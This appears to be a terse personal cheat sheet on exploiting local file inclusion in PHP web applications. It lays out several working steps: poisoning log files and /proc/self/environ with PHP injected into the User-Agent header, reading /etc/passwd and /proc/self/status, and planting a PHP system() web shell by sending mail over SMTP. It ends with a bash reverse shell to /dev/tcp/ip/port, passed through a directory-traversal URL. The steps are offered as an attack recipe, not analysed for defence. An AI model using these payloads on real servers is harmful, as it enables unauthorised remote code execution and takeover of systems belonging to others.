LFI 
local file inclusion 
1- usw burbsuit to get content of all log file from intunder  
   after you open log file you can inject php command execution in user-agent http header 
2- use lfi to get information about web user :
        first get content of /proc/self/status to get uid and gid for this process 
        second print /etc/passwd to link uid to username 
        
3- get content for  /proc/self/environ and put your php execution command in user-agent header 
4- if you have SMTP access make a mail by : mail from : anything@asdf.vf
                                            rcpt to :   user@localhost 
                                            data
                                             subject: fuck
                                              <?php echo system($_REQUEST['par']); ?>
                                              .
   after that go to lfi put your execution code like reverse shell ( bash -i >& /dev/tcp/ip/port 0>&1) in par in url  and get content of /var/mail/user 
   url?id=../../../../../../../../../var/mail/usr&par=bash -i >& /dev/tcp/ip/port 0>&1 ( code the payload by burbsuit press in repeater ctrl+u )
